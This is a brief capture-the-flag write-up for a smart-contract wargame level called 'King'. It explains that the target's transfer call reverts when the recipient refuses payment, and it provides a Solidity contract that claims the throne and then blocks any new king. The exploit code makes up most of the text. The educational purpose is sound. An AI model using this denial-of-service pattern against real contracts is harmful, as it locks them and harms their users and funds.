# King

The `transfer` function will revert if the transaction fails. We can use this to break the King contract by crafting a smart contract that does not accept payments through typical means. Since the King contract reverts before assigning a new king, a new king will never be crowned (mwahaha).

```javascript
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract SoSelfless {

    constructor(address payable _instance) payable {
        _instance.call{value: msg.value}("");
    }
}
```